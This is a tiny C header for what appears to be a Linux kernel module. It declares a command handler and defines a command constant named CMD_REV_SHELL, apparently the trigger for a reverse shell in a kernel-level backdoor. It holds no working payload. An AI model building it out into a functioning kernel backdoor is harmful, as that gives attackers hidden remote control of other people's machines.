#ifndef CMD_H
#define CMD_H
#include <linux/kernel.h>
#include <linux/string.h>

#define CMD_REV_SHELL "shell"

int handle_cmd(uint8_t *cmd, size_t len);

#endif
